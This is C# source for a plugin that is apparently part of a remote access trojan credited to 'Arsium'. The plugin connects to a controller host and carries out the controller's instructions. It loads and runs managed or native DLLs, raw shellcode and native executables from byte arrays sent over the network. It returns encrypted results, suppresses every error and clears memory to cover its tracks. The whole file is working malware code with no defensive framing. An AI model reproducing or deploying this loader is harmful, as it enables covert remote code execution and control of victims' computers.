using Shared;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;
using static Shared.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                PacketType T = (Shared.PacketType)Param[0];
                Data D = new Data();
                D.HWID = HWID;
                D.IP_Origin = BaseIP;
                byte[] b;
                ReturnHelper res;
                switch (T)
                {
                    case PacketType.EXEC_MANAGED_DLL:
                        b = (byte[])Param[1];
                        res = await Task.Run(() => Functions.ExecuteManaged(ref b, Param[2].ToString()));
                        D.Type = PacketType.EXEC_MANAGED_DLL;
                        D.DataReturn = new object[] { res , Param[3].ToString() };
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.EXEC_NATIVE_DLL:
                        b = (byte[])Param[1];
                        res = await Task.Run(() => Functions.ExecuteUnmanaged(b));
                        D.Type = Shared.PacketType.EXEC_NATIVE_DLL;
                        D.DataReturn = new object[] { res , Param[2].ToString() };
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.EXEC_SHELL_CODE:
                        b = (byte[])Param[1];
                        res = await Task.Run(() => Functions.ExecuteShellCode(b));
                        D.Type = PacketType.EXEC_SHELL_CODE;
                        D.DataReturn = new object[] { res, Param[2].ToString() };
                        await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.EXEC_NATIVE_EXE:
                        b = (byte[])Param[1];
                        res = await Task.Run(() => Functions.ExecuteNativePE(b));
                        D.Type = PacketType.EXEC_NATIVE_EXE;
                        D.DataReturn = new object[] { res, Param[2].ToString() };
                        //await Task.Run(() => Shared.Serializer.SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;
                }
                S.Close();
                S.Dispose();
            }
            catch {}
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
